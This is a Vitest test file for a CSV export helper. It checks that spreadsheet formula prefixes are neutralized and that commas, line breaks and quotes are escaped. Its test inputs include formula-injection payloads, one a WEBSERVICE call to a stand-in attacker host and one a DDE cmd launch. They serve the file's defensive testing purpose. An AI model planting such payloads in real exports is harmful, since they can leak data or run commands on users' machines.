import { describe, expect, it } from "vitest";
import { csvCell, csvRow } from "./csv";

describe("CSV export boundary", () => {
  it.each([
    ["=WEBSERVICE(\"https://attacker.example\")", "\"'=WEBSERVICE(\"\"https://attacker.example\"\")\""],
    ["  +cmd|' /C calc'!A0", "\"'  +cmd|' /C calc'!A0\""],
    ["\t@SUM(1,2)", "\"'\t@SUM(1,2)\""],
    ["\rplain", "\"'\rplain\""],
  ])("neutralizes spreadsheet command prefixes", (value, expected) => {
    expect(csvCell(value)).toBe(expected);
  });

  it("quotes commas, CR/LF, and embedded quotes without changing row shape", () => {
    expect(csvRow(["홍,길동", "line1\r\nline2", 'say "hello"'])).toBe(
      '"홍,길동","line1\r\nline2","say ""hello"""',
    );
  });

  it("keeps numeric values numeric while quoting them for CSV transport", () => {
    expect(csvRow([-100, 2500, null])).toBe('"-100","2500",""');
  });
});
